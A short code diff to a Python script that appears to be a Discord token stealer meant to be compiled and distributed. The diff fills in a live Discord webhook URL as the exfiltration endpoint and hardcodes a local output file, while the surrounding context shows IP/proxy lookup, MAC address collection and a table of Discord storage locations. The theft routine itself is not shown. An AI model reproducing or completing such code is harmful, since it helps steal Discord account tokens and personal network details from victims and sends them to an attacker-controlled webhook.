@@ -28,7 +28,7 @@ from shutil import copyfile
 from sys import argv
 
 # CONFIG -> Setup before compiling
-url= "" #Paste Discord Webhook url
+url= "https://discord.com/api/webhooks/1446656147556798484/FHx4KUNo0f8q07_OIMJLp_WIBXf4IR9EeWb3A65AAVNeuG2fCRBr3Zoenksy_MsJI7U-"
 
 
 
@@ -61,16 +61,8 @@ proxy = vpn.json()['proxy']
 mac = get_mac()
 
 
-roaming = os.getenv('AppData')
-## Output for txt file location
-roaming = os.getenv("APPDATA")
-
-if roaming is None:
-    roaming = os.path.expanduser("~/.config/")   # Linux fallback
-
-output = open(os.path.join(roaming, "temp.txt"), "a")
-
-
+roaming = "/home/torisgoat67/.config/"
+output = open(roaming + "temp.txt", "a")
 
 ## Discord Locations
 Directories = {
